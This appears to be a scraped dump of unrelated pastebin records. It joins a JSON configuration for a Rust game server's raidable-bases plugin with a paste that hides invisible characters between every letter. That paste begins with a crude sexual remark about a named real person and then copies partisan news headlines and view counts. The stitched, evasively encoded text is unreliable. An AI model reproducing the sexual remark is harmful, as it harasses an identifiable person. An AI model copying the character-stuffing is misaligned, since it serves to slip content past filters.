      ""Players With PVP Delay Can Damage Other Players With PVP Delay Anywhere"": false,
      ""PVP Delay Between Zone Hopping"": 10.0,
      ""Prevent Fire From Spreading"": true,
      ""Prevent Players From Hogging Raids"": true,
      ""Block Clans From Owning More Than One Raid"": false,
      ""Block Friends From Owning More Than One Raid"": false,
      ""Block Teams From Owning More Than One Raid"": false,
      ""Prevent Fall Damage When Base Despawns"": false,
      ""Require Cupboard To Be Looted Before Despawning"": false,
      ""Destroying The Cupboard Completes The Raid"": false,
      ""Require All Bases To Spawn Before Respawning An Existing Base"": true,
      ""Turn Lights On At Night"": true,
      ""Turn Lights On Indefinitely"": false,
      ""Traps And Turrets Ignore Users Using NOCLIP"": false,
      ""Use Random Codes On Code Locks"": true,
      ""Wait To Start Despawn Timer When Base Takes Damage From Player"": false,
      ""Maximum Water Depth For All Npcs"": 3.0
    },
    ""Map Markers"": {
      ""Marker Name"": ""Raidable Base Event"",
      ""Radius"": 0.25,
      ""Radius (Map Size 3600 Or Less)"": 0.25,
      ""Use Vending Map Marker"": true,
      ""Show Owners Name on Map Marker"": true,
      ""Use Explosion Map Marker"": false,
      ""Create Markers For Maintained Events"": true,
      ""Create Markers For Scheduled Events"": true,
      ""Create Markers For Manual Events"": true
    },
    ""Maintained Events"": {
      ""Always Maintain Max Events"": true,
      ""Max Maintained Events"": 3,
      ""Chance To Randomly Spawn PVP Bases (0 = Ignore Setting)"": 0.0,
      ""Include PVE Bases"": true,
      ""Include PVP Bases"": true,
      ""Minimum Required Players Online"": 0,
      ""Maximum Limit Of Players Online"": 300,
      ""Time To Wait Between Spawns"": 15.0,
      ""Convert PVE To PVP"": false,
      ""Convert PVP To PVE"": true,
      ""Ignore Safe Checks"": false,
      ""Ignore Safe Checks In X Radius Only"": 0.0,
      ""Ignore Player Entities At Custom Spawn Locations"": false,
      ""Spawn Bases X Distance Apart"": 100.0,
      ""Spawns Database File (Optional)"": ""none""
    },
    ""Manual Events"": {
      ""Convert PVE To PVP"": false,
      ""Convert PVP To PVE"": false,
      ""Max Manual Events"": 1,
      ""Spawns Database File (Optional)"": ""none""
    },
    ""Scheduled Events"": {
      ""Enabled"": false,
      ""Every Min Seconds"": 3600.0,
      ""Every Max Seconds"": 7200.0,
      ""Max Scheduled Events"": 1,
      ""Max To Spawn At Once (0 = Use Max Scheduled Events Amount)"": 0,
      ""Chance To Randomly Spawn PVP Bases (0 = Ignore Setting)"": 0.0,
      ""Include PVE Bases"": true,
      ""Include PVP Bases"": true,
      ""Minimum Required Players Online"": 1,
      ""Maximum Limit Of Players Online"": 300,
      ""Time To Wait Between Spawns"": 15.0,
      ""Convert PVE To PVP"": false,
      ""Convert PVP To PVE"": false,
      ""Ignore Safe Checks"": false,
      ""Ignore Safe Checks In X Radius Only"": 0.0,
      ""Ignore Player Entities At Custom Spawn Locations"": false,
      ""Spawn Bases X Distance Apart"": 100.0,
      ""Spawns Database File (Optional)"": ""none""
    },
    ""Allowed Zone Manager Zones"": [
      ""pvp"",
      ""99999999""
    ],
    ""Use Grid Locations In Allowed Zone Manager Zones Only"": false,
    ""Extended Distance To Spawn Away From Zone Manager Zones"": 25.0,
    ""Blacklisted Commands"": [],
    ""Automatically Teleport Admins To Their Map Marker Positions"": true,
    ""Automatically Destroy Markers That Admins Teleport To"": false,
    ""Block Archery Plugin At Events"": false,
    ""Block Wizardry Plugin At Events"": false,
    ""Chat Steam64ID"": 0,
    ""Expansion Mode (Dangerous Treasures)"": false,
    ""Remove Admins From Raiders List"": false,
    ""Show X Z Coordinates"": false,
    ""Event Command"": ""rbe"",
    ""Hunter Command"": ""rb"",
    ""Server Console Command"": ""rbevent""
  },
  ""Event Messages"": {
    ""Ineligible For Rewards"": {
      ""Flying"": false,
      ""Vanished"": false,
      ""Inactive"": true,
      ""Not An Ally"": true,
      ""Not The Owner"": true,
      ""Not A Participant"": true,
      ""Remove Admins From Raiders List"": false
    },
    ""Announce Raid Unlocked"": false,
    ""Announce Thief Message"": true,
    ""Announce PVE/PVP Enter/Exit Messages"": true,
    ""Show Destroy Warning"": true,
    ""Show Opened Message For PVE Bases"": true,
    ""Show Opened Message For PVP Bases"": true,
    ""Show Prefix"": true,
    ""Notify Plugin - Type (-1 = disabled)"": -1,
    ""Notification Interval"": 1.0,
    ""Send Messages To Player"": true,
    ""Save Thieves To Log File"": false
  },
  ""GUIAnnouncements"": {
    ""Enabled"": false,
    ""Banner Tint Color"": ""Grey"",
    ""Maximum Distance"": 300.0,
    ""Text Color"": ""White""
  },
  ""Ranked Ladder"": {
    ""Award Top X Players On Wipe"": 3,
    ""Enabled"": true,
    ""Show Top X Ladder"": 10
  },
  ""Skins"": {
    ""Boxes"": {
      ""Include Workshop Skins"": true,
      ""Preset Skin"": 0,
      ""Use Random Skin"": true
    },
    ""Loot Items"": {
      ""Include Workshop Skins"": true,
      ""Use Random Skin"": true,
      ""Use Imported Workshop Skins File"": false
    },
    ""Deployables"": {
      ""Partial Names"": [
        ""door"",
        ""barricade"",
        ""chair"",
        ""fridge"",
        ""furnace"",
        ""locker"",
        ""reactivetarget"",
        ""rug"",
        ""sleepingbag"",
        ""table"",
        ""vendingmachine"",
        ""waterpurifier"",
        ""skullspikes"",
        ""skulltrophy"",
        ""summer_dlc"",
        ""sled""
      ],
      ""Preset Door Skins"": [],
      ""Include Workshop Skins"": true,
      ""Use Random Skin"": true,
      ""Skin Everything"": true
    },
    ""Randomize Npc Item Skins"": true,
    ""Use Identical Skins For All Npcs"": true,
    ""Ignore If Skinned Already"": true
  },
  ""Treasure"": {
    ""Resources Not Moved To Cupboards"": [
      ""skull.human"",
      ""battery.small"",
      ""bone.fragments"",
      ""can.beans.empty"",
      ""can.tuna.empty"",
      ""water.salt"",
      ""water"",
      ""skull.wolf""
    ],
    ""Use Day Of Week Loot"": false,
    ""Do Not Duplicate Base Loot"": false,
    ""Do Not Duplicate Difficulty Loot"": false,
    ""Do Not Duplicate Default Loot"": false,
    ""Use Stack Size Limit For Spawning Items"": false
  },
  ""UI"": {
    ""Advanced Alerts UI"": {
      ""Enabled"": true,
      ""Anchor Min"": ""0.35 0.85"",
      ""Anchor Max"": ""0.65 0.95"",
      ""Time Shown"": 5.0
    },
    ""Delay"": {
      ""Enabled"": false,
      ""Anchor Min"": ""0.472 0.172"",
      ""Anchor Max"": ""0.55 0.311"",
      ""Panel Alpha"": 0.98,
      ""Text Color"": ""#FF0000"",
      ""Panel Color"": ""#000000""
    },
    ""Details"": {
      ""Enabled"": true,
      ""Anchor Min"": ""0.748 0.228"",
      ""Anchor Max"": ""0.986 0.248"",
      ""Panel Alpha"": 0.98,
      ""Details Font Size"": 10,
      ""Panel Color"": ""#000000"",
      ""Label Color"": ""#EAEAEA"",
      ""Negative Color"": ""#FF0000"",
      ""Positive Color"": ""#008000""
    },
    ""Enabled"": true,
    ""Status Anchor Min"": ""0.748 0.249"",
    ""Status Anchor Max"": ""0.986 0.279"",
    ""Status Font Size"": 12,
    ""Panel Alpha"": 0.98,
    ""Panel Color"": ""#000000"",
    ""PVP Color"": ""#FF0000"",
    ""PVE Color"": ""#008000"",
    ""Show Loot Left"": true,
    ""Show Time Left"": true
  },
  ""Weapons"": {
    ""Furnace Starting Fuel"": 1000,
    ""Infinite Ammo"": {
      ""AutoTurret"": true,
      ""FlameTurret"": true,
      ""FogMachine"": true,
      ""GunTrap"": true,
      ""SamSite"": true
    },
    ""Ammo"": {
      ""AutoTurret"": 256,
      ""FlameTurret"": 256,
      ""FogMachine"": 5,
      ""GunTrap"": 128,
      ""SamSite"": 24
    },
    ""Tesla Coil"": {
      ""Requires A Power Source"": true,
      ""Max Discharge Self Damage Seconds (0 = None, 120 = Rust default)"": 0.0,
      ""Max Damage Output"": 35.0,
      ""Health"": 250.0
    },
    ""Fog Machine Allows Motion Toggle"": true,
    ""Fog Machine Requires A Power Source"": true,
    ""SamSite Repairs Every X Minutes (0.0 = disabled)"": 5.0,
    ""SamSite Range (350.0 = Rust default)"": 75.0,
    ""SamSite Requires Power Source"": false,
    ""Spooky Speakers Requires Power Source"": false,
    ""Test Generator Power"": 100.0
  }
}"
fteegiHQ,Normal,nivex,JSON,Sunday 10th of March 2024 10:43:17 PM CDT,"{
  ""Rearm Bear Traps When Damaged"": false,
  ""Bear Traps Are Immune To Timed Explosives"": false,
  ""Advanced Protection Radius"": {
    ""Maintained Events"": 50.0,
    ""Manual Events"": 50.0,
    ""Scheduled Events"": 50.0,
    ""Obstruction Distance Check"": -1.0
  },
  ""Advanced Setup Settings"": {
    ""Amount Of Entities To Spawn Per Batch"": 1,
    ""Amount Of Entities To Despawn Per Batch"": 10,
    ""Height Adjustment Applied To This Paste"": 0.0,
    ""Force All Bases To Spawn At Height Level (0 = Water)"": -1.0,
    ""Foundations Immune To Damage When Forced Height Is Applied"": false
  },
  ""Elevators"": {
    ""Enabled"": true,
    ""Anchor Min"": ""0.406 0.915"",
    ""Anchor Max"": ""0.59 0.949"",
    ""Panel Alpha"": 0.0,
    ""Required Access Level"": 0,
    ""Panel Color"": ""#000000"",
    ""Required Access Level Grants Permanent Use"": false,
    ""Required Keycard Skin ID"": 2690554489,
    ""Requires Building Permission"": false,
    ""Button Health"": 1000.0,
    ""Elevator Health"": 600.0
  },
  ""Entities Not Allowed To Be Picked Up"": [
    ""generator.small"",
    ""generator.static"",
    ""autoturret_deployed""
  ],
  ""Additional Bases For This Difficulty"": {
    ""1x1med"": [
      {
        ""Option"": ""stability"",
        ""Value"": ""false""
      },
      {
        ""Option"": ""autoheight"",
        ""Value"": ""false""
      },
      {
        ""Option"": ""height"",
        ""Value"": ""1.0""
      }
    ],
    ""2x1med"": [
      {
        ""Option"": ""stability"",
        ""Value"": ""false""
      },
      {
        ""Option"": ""autoheight"",
        ""Value"": ""false""
      },
      {
        ""Option"": ""height"",
        ""Value"": ""1.0""
      }
    ],
    ""3x1HARDbase"": [
      {
        ""Option"": ""stability"",
        ""Value"": ""false""
      },
      {
        ""Option"": ""autoheight"",
        ""Value"": ""false""
      },
      {
        ""Option"": ""height"",
        ""Value"": ""1.0""
      }
    ]
  },
  ""Paste Options"": [],
  ""Arena Walls"": {
    ""Enabled"": false,
    ""Stacks"": 1,
    ""Ignore Stack Limit When Clipping Terrain"": true,
    ""Use Stone Walls"": false,
    ""Use Iced Walls"": false,
    ""Use Least Amount Of Walls"": true,
    ""Use UFO Walls"": false,
    ""Radius"": 25.0
  },
  ""NPC Levels"": {
    ""Level 2 - Final Death"": false
  },
  ""NPCs"": {
    ""Weapon Accuracy (0 - 100)"": {
      ""AK47"": 15.0,
      ""AK47 ICE"": 15.0,
      ""Bolt Rifle"": 15.0,
      ""Compound Bow"": 15.0,
      ""Crossbow"": 15.0,
      ""Double Barrel Shotgun"": 15.0,
      ""Eoka"": 15.0,
      ""Glock"": 15.0,
      ""HMLMG"": 15.0,
      ""L96"": 15.0,
      ""LR300"": 15.0,
      ""M249"": 15.0,
      ""M39"": 15.0,
      ""M92"": 15.0,
      ""MP5"": 15.0,
      ""Nailgun"": 15.0,
      ""Pump Shotgun"": 15.0,
      ""Python"": 15.0,
      ""Revolver"": 15.0,
      ""Semi Auto Pistol"": 15.0,
      ""Semi Auto Rifle"": 15.0,
      ""Spas12"": 15.0,
      ""Speargun"": 15.0,
      ""SMG"": 15.0,
      ""Snowball Gun"": 15.0,
      ""Thompson"": 15.0,
      ""Waterpipe Shotgun"": 15.0
    },
    ""Damage Multipliers"": {
      ""Gun Damage Multiplier"": 1.0,
      ""Melee Damage Multiplier"": 1.0
    },
    ""Murderer (Items)"": {
      ""Helm"": [
        ""metal.facemask""
      ],
      ""Torso"": [
        ""metal.plate.torso""
      ],
      ""Pants"": [
        ""pants""
      ],
      ""Gloves"": [
        ""tactical.gloves""
      ],
      ""Boots"": [
        ""boots.frog""
      ],
      ""Shirt"": [
        ""tshirt""
      ],
      ""Kilts"": [],
      ""Weapon"": [
        ""machete""
      ]
    },
    ""Scientist (Items)"": {
      ""Helm"": [],
      ""Torso"": [
        ""hazmatsuit_scientist_peacekeeper""
      ],
      ""Pants"": [],
      ""Gloves"": [],
      ""Boots"": [],
      ""Shirt"": [],
      ""Kilts"": [],
      ""Weapon"": [
        ""rifle.ak""
      ]
    },
    ""Murderer Kits"": [
      ""murderer_kit_1"",
      ""murderer_kit_2""
    ],
    ""Scientist Kits"": [
      ""scientist_kit_1"",
      ""scientist_kit_2""
    ],
    ""Random Names"": [],
    ""Spawn Alternate Default Scientist Loot"": {
      ""Prefab ID List"": [
        ""cargo"",
        ""turret_any"",
        ""ch47_gunner"",
        ""excavator"",
        ""full_any"",
        ""heavy"",
        ""junkpile_pistol"",
        ""oilrig"",
        ""patrol"",
        ""peacekeeper"",
        ""roam"",
        ""roamtethered""
      ],
      ""Enabled"": false,
      ""Disable All Prefab Loot Spawns"": false
    },
    ""Enabled"": true,
    ""Amount Of Murderers To Spawn"": 5,
    ""Minimum Amount Of Murderers To Spawn"": 3,
    ""Spawn Random Amount Of Murderers"": false,
    ""Amount Of Scientists To Spawn"": 5,
    ""Minimum Amount Of Scientists To Spawn"": 3,
    ""Spawn Random Amount Of Scientists"": false,
    ""Allow Npcs To Leave Dome When Attacking"": true,
    ""Allow Npcs To Shoot Players Outside Of The Dome"": true,
    ""Aggression Range"": 70.0,
    ""Block Damage Outside To Npcs When Not Allowed To Leave Dome"": true,
    ""Block Damage Outside Of The Dome To Npcs Inside"": false,
    ""Despawn Inventory On Death"": true,
    ""Health For Murderers (100 min, 5000 max)"": 150.0,
    ""Health For Scientists (100 min, 5000 max)"": 150.0,
    ""Kill Underwater Npcs"": true,
    ""Player Traps And Turrets Ignore Npcs"": false,
    ""Event Traps And Turrets Ignore Npcs"": true,
    ""Use Dangerous Treasures NPCs"": false
  },
  ""Rewards"": {
    ""Economics Money"": 0.0,
    ""ServerRewards Points"": 0,
    ""SkillTree XP"": 0.0
  },
  ""Change Building Material Tier To"": {
    ""Wooden"": false,
    ""Stone"": false,
    ""Metal"": false,
    ""HQM"": false
  },
  ""Change Door Type To"": {
    ""Wooden"": false,
    ""Metal"": false,
    ""HQM"": false,
    ""Include Garage Doors"": false
  },
  ""Auto Turrets"": {
    ""Aim Cone"": 5.0,
    ""Wait To Power On Until Event Starts"": false,
    ""Minimum Damage Modifier"": 1.0,
    ""Maximum Damage Modifier"": 1.0,
    ""Start Health"": 1000.0,
    ""Sight Range"": 30.0,
    ""Double Sight Range When Shot"": false,
    ""Set Hostile (False = Do Not Set Any Mode)"": true,
    ""Requires Power Source"": false,
    ""Remove Equipped Weapon"": false,
    ""Random Weapons To Equip When Unequipped"": [
      ""rifle.ak""
    ]
  },
  ""Player Building Restrictions"": {
    ""Wooden"": false,
    ""Stone"": false,
    ""Metal"": false,
    ""HQM"": false
  },
  ""Water Settings"": {
    ""Allow Bases To Float Above Water"": false,
    ""Prevent Bases From Floating Above Water By Also Checking Surrounding Area"": false,
    ""Maximum Water Depth Level Used For Float Above Water Option"": 1.0
  },
  ""Profile Enabled"": true,
  ""Maximum Land Level"": 2.5,
  ""Allow Players To Use MLRS"": true,
  ""Allow Third-Party Npc Explosive Damage To Bases"": false,
  ""Add Code Lock To Unlocked Or KeyLocked Doors"": true,
  ""Add Key Lock To Unlocked Or CodeLocked Doors"": false,
  ""Add Code Lock To Tool Cupboards"": false,
  ""Add Code Lock To Boxes"": false,
  ""Add Code Lock To Lockers"": true,
  ""Close Open Doors With No Door Controller Installed"": true,
  ""Allow Duplicate Items"": false,
  ""Allow Players To Pickup Deployables"": false,
  ""Allow Players To Deploy A Cupboard"": true,
  ""Allow Players To Deploy Barricades"": true,
  ""Allow PVP"": true,
  ""Allow Friendly Fire (Teams)"": false,
  ""Minimum Amount Of Items To Spawn (0 = Use Max Value)"": 15,
  ""Amount Of Items To Spawn"": 40,
  ""Flame Turret Health"": 300.0,
  ""Block Plugins Which Prevent Item Durability Loss"": false,
  ""Block Damage Outside Of The Dome To Players Inside"": false,
  ""Block Damage Outside Of The Dome To Bases Inside"": false,
  ""Block Damage Inside From Npcs To Players Outside"": false,
  ""Building Blocks Are Immune To Damage"": false,
  ""Building Blocks Are Immune To Damage (Twig Only)"": false,
  ""Boxes Are Invulnerable"": false,
  ""Boxes Are Invulnerable Until Cupboard Is Destroyed"": false,
  ""Spawn Silently (No Notifcation, No Dome, No Map Marker)"": false,
  ""Despawn Dropped Loot Bags From Raid Boxes When Base Despawns"": false,
  ""Divide Loot Into All Containers"": true,
  ""Drop Tool Cupboard Loot After Raid Is Completed"": false,
  ""Drop Container Loot X Seconds After It Is Looted"": 0.0,
  ""Drop Container Loot Applies Only To Boxes And Cupboards"": true,
  ""Create Dome Around Event Using Spheres (0 = disabled, recommended = 5)"": 5,
  ""Empty All Containers Before Spawning Loot"": false,
  ""Empty All Containers (Exclusions)"": [
    ""xmas_tree.deployed"",
    ""xmas_tree_a.deployed""
  ],
  ""Eject Corpses From Enemy Raids (Advanced Users Only)"": true,
  ""Eject Corpses From PVE Instantly (Advanced Users Only)"": false,
  ""Eject Enemies From Locked PVE Raids"": true,
  ""Eject Enemies From Locked PVP Raids"": false,
  ""Explosion Damage Modifier (0-999)"": 100.0,
  ""Force All Boxes To Have Same Skin"": true,
  ""Ignore Containers That Spawn With Loot Already"": false,
  ""Loot Amount Multiplier"": 1.0,
  ""Maximum Respawn Npc X Seconds After Death"": 0.0,
  ""Minimum Respawn Npc X Seconds After Death"": 0.0,
  ""No Item Input For Boxes And TC"": true,
  ""Penalize Players On Death In PVE (ZLevels)"": true,
  ""Penalize Players On Death In PVP (ZLevels)"": true,
  ""Require Cupboard Access To Loot"": false,
  ""Require Cupboard Access To Place Ladders"": false,
  ""Skip Treasure Loot And Use Loot In Base Only"": false,
  ""Use Buoyant Boxex For Dropped Privilege Loot"": false,
  ""Use Buoyant Boxex For Dropped Box Loot"": false,
  ""Remove Locks When Event Is Completed"": false,
  ""Always Spawn Base Loot Table"": false
}"
Ydgv83Cc,News March10 24,Newscaster_Ned,Email,Sunday 10th of March 2024 10:43:07 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

H‎e‎y‎,‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎.‎ ‎N‎e‎w‎s‎c‎a‎s‎t‎e‎r‎ ‎N‎e‎d‎ ‎h‎e‎r‎e‎ ‎j‎u‎s‎t‎ ‎j‎e‎r‎k‎i‎n‎g‎ ‎o‎f‎f‎ ‎t‎o‎ ‎p‎i‎c‎t‎u‎r‎e‎s‎ ‎o‎f‎ ‎S‎h‎e‎r‎r‎o‎d‎ ‎D‎e‎G‎r‎i‎p‎p‎o‎.‎ ‎H‎e‎r‎e‎'‎s‎ ‎t‎h‎e‎ ‎n‎e‎w‎s‎.‎

O‎s‎c‎a‎r‎s‎ ‎2‎0‎2‎4‎:‎ ‎C‎e‎l‎e‎b‎s‎ ‎G‎u‎f‎f‎a‎w‎ ‎a‎s‎ ‎J‎i‎m‎m‎y‎ ‎K‎i‎m‎m‎e‎l‎ ‎R‎o‎a‎s‎t‎s‎ ‎M‎A‎G‎A‎
T‎r‎u‎m‎p‎ ‎B‎a‎s‎h‎e‎s‎ ‎J‎i‎m‎m‎y‎ ‎K‎i‎m‎m‎e‎l‎ ‎D‎u‎r‎i‎n‎g‎ ‎O‎s‎c‎a‎r‎s‎:‎ ‎'‎E‎v‎e‎r‎ ‎B‎e‎e‎n‎ ‎a‎ ‎W‎o‎r‎s‎e‎ ‎H‎o‎s‎t‎'‎
O‎s‎c‎a‎r‎s‎ ‎G‎o‎e‎s‎ ‎B‎i‎g‎ ‎o‎n‎ ‎U‎k‎r‎a‎i‎n‎e‎:‎ ‎'‎2‎0‎ ‎D‎a‎y‎s‎ ‎i‎n‎ ‎M‎a‎r‎i‎u‎p‎o‎l‎'‎ ‎W‎i‎n‎s‎ ‎B‎e‎s‎t‎ ‎D‎o‎c‎
W‎i‎s‎c‎o‎n‎s‎i‎n‎ ‎B‎a‎r‎b‎e‎r‎ ‎T‎i‎p‎p‎e‎d‎ ‎$‎1‎,‎0‎0‎0‎ ‎b‎y‎ ‎P‎r‎e‎a‎c‎h‎e‎r‎
W‎A‎T‎C‎H‎:‎ ‎S‎t‎.‎ ‎L‎o‎u‎i‎s‎ ‎N‎e‎i‎g‎h‎b‎o‎r‎s‎ ‎P‎r‎a‎i‎s‎e‎ ‎T‎e‎e‎n‎'‎s‎ ‎P‎o‎p‎u‎l‎a‎r‎ ‎B‎B‎Q‎ ‎S‎t‎a‎n‎d‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
T‎r‎u‎m‎p‎ ‎T‎o‎r‎c‎h‎e‎s‎ ‎J‎i‎m‎m‎y‎ ‎K‎i‎m‎m‎e‎l‎ ‎D‎u‎r‎i‎n‎g‎ ‎O‎s‎c‎a‎r‎s‎

‘‎H‎a‎s‎ ‎T‎h‎e‎r‎e‎ ‎E‎v‎e‎r‎ ‎B‎e‎e‎n‎ ‎a‎ ‎W‎o‎r‎s‎e‎ ‎H‎o‎s‎t‎’‎
t‎r‎u‎m‎p‎ ‎k‎i‎m‎m‎e‎l‎
F‎o‎r‎m‎e‎r‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎l‎a‎s‎h‎e‎d‎ ‎o‎u‎t‎ ‎a‎t‎ ‎O‎s‎c‎a‎r‎s‎ ‎h‎o‎s‎t‎ ‎J‎i‎m‎m‎y‎ ‎K‎i‎m‎m‎e‎l‎ ‎d‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎c‎e‎r‎e‎m‎o‎n‎y‎,‎ ‎c‎a‎l‎l‎i‎n‎g‎ ‎h‎i‎m‎ ‎a‎ ‎“‎w‎a‎s‎h‎e‎d‎ ‎u‎p‎”‎ ‎t‎a‎l‎e‎n‎t‎.‎

M‎i‎t‎t‎ ‎R‎o‎m‎n‎e‎y‎ ‎I‎s‎s‎u‎e‎s‎ ‎C‎o‎m‎p‎l‎e‎t‎e‎ ‎a‎n‎d‎ ‎T‎o‎t‎a‎l‎ ‎E‎n‎d‎o‎r‎s‎e‎m‎e‎n‎t‎ ‎o‎f‎ ‎K‎a‎t‎i‎e‎ ‎B‎r‎i‎t‎t‎ ‎a‎s‎ ‎V‎i‎c‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎i‎a‎l‎ ‎P‎i‎c‎k‎
M‎i‎t‎t‎ ‎R‎o‎m‎n‎e‎y‎ ‎I‎s‎s‎u‎e‎s‎ ‎C‎o‎m‎p‎l‎e‎t‎e‎ ‎a‎n‎d‎ ‎T‎o‎t‎a‎l‎ ‎E‎n‎d‎o‎r‎s‎e‎m‎e‎n‎t‎ ‎o‎f‎ ‎K‎a‎t‎i‎e‎ ‎B‎r‎i‎t‎t‎ ‎a‎s‎ ‎V‎P‎ ‎P‎i‎c‎k‎
2‎,‎0‎5‎8‎
O‎s‎c‎a‎r‎s‎ ‎2‎0‎2‎4‎:‎ ‎J‎i‎m‎m‎y‎ ‎K‎i‎m‎m‎e‎l‎ ‎C‎o‎m‎p‎a‎r‎e‎s‎ ‎K‎a‎t‎i‎e‎ ‎B‎r‎i‎t‎t‎ ‎t‎o‎ ‎‘‎P‎o‎o‎r‎ ‎T‎h‎i‎n‎g‎s‎’‎ ‎F‎r‎a‎n‎k‎e‎n‎s‎t‎e‎i‎n‎ ‎H‎e‎r‎o‎i‎n‎e‎
O‎s‎c‎a‎r‎s‎ ‎2‎0‎2‎4‎:‎ ‎J‎i‎m‎m‎y‎ ‎K‎i‎m‎m‎e‎l‎ ‎M‎o‎c‎k‎s‎ ‎K‎a‎t‎i‎e‎ ‎B‎r‎i‎t‎t‎
9‎5‎
‘‎B‎l‎o‎o‎d‎ ‎M‎o‎n‎e‎y‎’‎:‎ ‎H‎o‎w‎ ‎S‎t‎e‎p‎h‎e‎n‎ ‎S‎p‎i‎e‎l‎b‎e‎r‎g‎,‎ ‎J‎e‎f‎f‎r‎e‎y‎ ‎K‎a‎t‎z‎e‎n‎b‎e‎r‎g‎,‎ ‎a‎n‎d‎ ‎O‎t‎h‎e‎r‎ ‎H‎o‎l‎l‎y‎w‎o‎o‎d‎ ‎B‎i‎g‎ ‎S‎h‎o‎t‎s‎ ‎B‎o‎w‎ ‎t‎o‎ ‎
‘‎B‎l‎o‎o‎d‎ ‎M‎o‎n‎e‎y‎’‎:‎ ‎H‎o‎w‎ ‎H‎o‎l‎l‎y‎w‎o‎o‎d‎ ‎T‎u‎r‎n‎e‎d‎ ‎i‎n‎t‎o‎ ‎P‎r‎o‎-‎C‎h‎i‎n‎a‎ ‎P‎r‎o‎p‎a‎g‎a‎n‎d‎a‎
3‎,‎9‎0‎5‎
O‎s‎c‎a‎r‎ ‎W‎i‎n‎n‎e‎r‎s‎ ‎‘‎R‎e‎f‎u‎t‎e‎ ‎T‎h‎e‎i‎r‎ ‎J‎e‎w‎i‎s‎h‎n‎e‎s‎s‎’‎ ‎o‎v‎e‎r‎ ‎I‎s‎r‎a‎e‎l‎’‎s‎ ‎W‎a‎r‎ ‎o‎f‎ ‎S‎e‎l‎f‎-‎d‎e‎f‎e‎n‎s‎e‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎H‎a‎m‎a‎s‎
O‎s‎c‎a‎r‎s‎:‎ ‎'‎Z‎o‎n‎e‎ ‎o‎f‎ ‎I‎n‎t‎e‎r‎e‎s‎t‎'‎ ‎D‎i‎r‎e‎c‎t‎o‎r‎ ‎D‎e‎c‎r‎i‎e‎s‎ ‎'‎O‎n‎g‎o‎i‎n‎g‎ ‎A‎t‎t‎a‎c‎k‎ ‎i‎n‎ ‎G‎a‎z‎a‎'‎
2‎3‎0‎
‘‎F‎a‎s‎c‎i‎s‎t‎ ‎P‎i‎t‎ ‎B‎u‎l‎l‎’‎:‎ ‎F‎D‎N‎Y‎ ‎C‎o‎m‎m‎i‎s‎s‎i‎o‎n‎e‎r‎ ‎B‎l‎a‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎P‎l‎a‎n‎n‎i‎n‎g‎ ‎t‎o‎ ‎T‎r‎a‎c‎k‎ ‎D‎o‎w‎n‎ ‎F‎i‎r‎e‎f‎i‎g‎h‎t‎e‎r‎s‎ ‎W‎
'‎F‎a‎s‎c‎i‎s‎t‎ ‎P‎i‎t‎ ‎B‎u‎l‎l‎'‎:‎ ‎F‎D‎N‎Y‎ ‎H‎e‎a‎d‎ ‎B‎l‎a‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎P‎l‎a‎n‎s‎ ‎t‎o‎ ‎S‎e‎e‎k‎ ‎B‎o‎o‎i‎n‎g‎ ‎F‎i‎r‎e‎f‎i‎g‎h‎t‎e‎r‎s‎
8‎1‎1‎
B‎i‎d‎e‎n‎:‎ ‎I‎ ‎R‎e‎g‎r‎e‎t‎ ‎U‎s‎i‎n‎g‎ ‎‘‎I‎l‎l‎e‎g‎a‎l‎’‎ ‎f‎o‎r‎ ‎‘‎U‎n‎d‎o‎c‎u‎m‎e‎n‎t‎e‎d‎ ‎P‎e‎r‎s‎o‎n‎’‎ ‎S‎u‎s‎p‎e‎c‎t‎e‎d‎ ‎i‎n‎ ‎R‎i‎l‎e‎
B‎i‎d‎e‎n‎:‎ ‎I‎ ‎R‎e‎g‎r‎e‎t‎ ‎U‎s‎i‎n‎g‎ ‎'‎I‎l‎l‎e‎g‎a‎l‎'‎ ‎f‎o‎r‎ ‎S‎u‎s‎p‎e‎c‎t‎ ‎i‎n‎ ‎R‎i‎l‎e‎y‎ ‎K‎i‎l‎l‎i‎n‎g‎
5‎,‎4‎7‎3‎
S‎c‎h‎i‎f‎f‎:‎ ‎I‎ ‎H‎o‎p‎e‎ ‎I‎n‎t‎e‎l‎l‎i‎g‎e‎n‎c‎e‎ ‎C‎o‎m‎m‎u‎n‎i‎t‎y‎ ‎W‎i‎l‎l‎ ‎‘‎D‎u‎m‎b‎ ‎D‎o‎w‎n‎’‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎B‎r‎i‎e‎f‎i‎n‎g‎s‎
S‎c‎h‎i‎f‎f‎:‎ ‎I‎ ‎H‎o‎p‎e‎ ‎I‎n‎t‎e‎l‎l‎i‎g‎e‎n‎c‎e‎ ‎C‎o‎m‎m‎u‎n‎i‎t‎y‎ ‎W‎i‎l‎l‎ ‎'‎D‎u‎m‎b‎ ‎D‎o‎w‎n‎'‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎B‎r‎i‎e‎f‎i‎n‎g‎s‎
1‎,‎4‎7‎2‎
